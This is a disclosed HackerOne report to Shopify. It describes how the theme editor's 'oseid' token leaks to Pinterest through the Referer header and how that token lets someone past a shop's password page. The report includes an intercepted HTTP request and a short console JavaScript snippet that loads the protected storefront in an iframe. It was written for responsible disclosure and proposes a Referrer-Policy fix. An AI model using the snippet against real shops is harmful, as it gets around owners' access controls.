# Theme editor `oseid` parameter is leaked to third-party services through the `Referer` header which leads to somekind of storefront password bypass.

## Report Details
- **Report ID**: 1262434
- **URL**: https://hackerone.com/reports/1262434
- **State**: Closed
- **Severity**: low
- **Submitted**: 2021-07-15T03:33:02.819Z
- **Disclosed**: 2022-07-11T17:13:48.111Z

## Reporter
- **Username**: saltymermaid
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
Hello Shopify,

## Summary
While reading @danishalkatiri's report #997350, I remembered a report that @francisbeaudoin shared with me some time ago*(mid-February 2021)* about leaking the theme editor `oseid` parameter and being able to exploit it to a point where he was able to somewhat bypass the storefront password. So, given all that knowledge, I went on to replicate pretty much what was done in #997350, but within the theme editor scope instead, hoping that the `oseid` parameter would be leaked through the `Referer` header...and it did!

## Requirements
1. A shop*(your-shop.myshopify.com)* with password protection enabled.

2. At least one active product (will be used in the theme editor preview).

3. Burp Suite Proxy.

## Steps to reproduce
1. **[Victim]** From your shop, in the themes page, customize your currently published theme and move on to the theme editor.

2. **[Victim]** In the theme editor, from the preview dropdown located on top, choose `Products` and then `Default product`.

3. **[Victim]** From the product page, in the editor preview, click any of the social media sharer icon that appears under the product details *(Pinterest used for this POC)*.
 3.1. Have Burp Suite proxy ready to intercept requests.

4. **[Victim]** A prompt is shown, telling you that the link cannot be opened inside the editor and that it will be opened in a new window, click ok and go on with it.

5. **[Victim]** Intercept the request with Brup Suite proxy and the intercepted request should look like the following:

	```http
	GET /pin/create/button/?url=https://{shop}.myshopify.com/products/example-t-shirt&media=//cdn.shopify.com/s/files/1/0262/8304/9016/products/saltymermaid-avatar_f9d13a6b-bb24-4dd8-b611-70ad25dd2d24_1024x1024.png?v=1617650754&description=Example%20T-Shirt HTTP/1.1
	Host: pinterest.com
	Sec-Ch-Ua: "Chromium";v="91", " Not;A Brand";v="99"
	Sec-Ch-Ua-Mobile: ?0
	Upgrade-Insecure-Requests: 1
	User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
	Sec-Fetch-Site: cross-site
	Sec-Fetch-Mode: navigate
	Sec-Fetch-User: ?1
	Sec-Fetch-Dest: document
	Referer: https://{shop}.myshopify.com/products/example-t-shirt?oseid={oseid}
	Accept-Encoding: gzip, deflate
	Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
	Connection: close
	```

6. **[Victim]** Notice the shop handle and `oseid` parameter are exposed at **line \#12** of the intercepted request through the `Referer` header.
 6.1.  From here, our shop handle and the oseid parameter would have been leaked to a third-party and potentially exposed to a malicious insider.

7. **[Attacker]** Now from a clean browser session (incognito recommended), go to your shop storefront where you should be faced with the "opening soon" or "password" page.

8. **[Attacker]** Open up your browser development tool and copy the following code snippet into your console while making sure to replace the `shopHandle ` and `oseid` variables with the right values:

	```javascript
	let shopHandle = 'victim-shop', oseid = 'oseid-1234';

	const iframe = document.createElement('iframe');	
	iframe.src = `https://${shopHandle}.myshopify.com/?oseid=${oseid}`;
	iframe.height = window.innerHeight;
	iframe.width = window.innerWidth;
	iframe.style.position = 'absolute';
	iframe.style.zIndex = '9001';
	iframe.style.top = iframe.style.left = 0; 

	document.querySelector('body').appendChild(iframe);
	```

9. **[Attacker]** At this point,  you should have "bypassed" the storefront password and should now be able to navigate within the iframe.

## Impact

In this scenario, the theme editor `oseid` parameter was leaked through the `Referer` header to a third-party service where a malicious insider could later exploit it. Per my understanding, injecting the iframe allows us to "bypass" the javascript redirection that we are normally confronted with when trying to browse the store directly from the address bar. This allows the attacker to "bypass" the storefront password as well and to finally navigate the store.

## Remediation
I believe this issue could be fixed pretty much like report #997350 by adding a `Referrer-Policy` header with the value `same-origin` when browsing the theme editor preview window.

Cheers.

## Attachments
No attachments
